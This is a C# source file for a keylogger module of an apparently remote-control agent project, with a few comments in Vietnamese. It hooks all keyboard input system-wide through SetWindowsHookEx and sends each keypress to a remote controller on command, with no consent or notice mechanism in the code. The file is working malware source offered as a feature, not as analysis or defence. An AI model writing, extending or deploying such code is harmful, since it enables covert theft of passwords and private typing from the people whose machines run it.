// Features/Keylogger.cs
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Windows.Forms;  // THÊM DÒNG NÀY
using System.Diagnostics;   // THÊM DÒNG NÀY (nếu dùng Process)

namespace RemoteControlAgent.Features
{
    public class Keylogger : IAgentFeature
    {
        public string Action => "keylogger_start";
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static AgentController? _controller;

        public void Execute(JsonElement request, AgentController controller)
        {
            var action = request.GetProperty("action").GetString();
            _controller = controller;

            if (action == "keylogger_start")
            {
                _hookID = SetHook(_proc);
                controller.SendResponse("keylogger_start", "started");
            }
            else if (action == "keylogger_stop")
            {
                UnhookWindowsHookEx(_hookID);
                controller.SendResponse("keylogger_stop", "stopped");
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using var curProcess = Process.GetCurrentProcess();
            using var curModule = curProcess.MainModule;
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                var key = (Keys)vkCode;
                _controller?.SendUpdate(key.ToString());
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
    }
}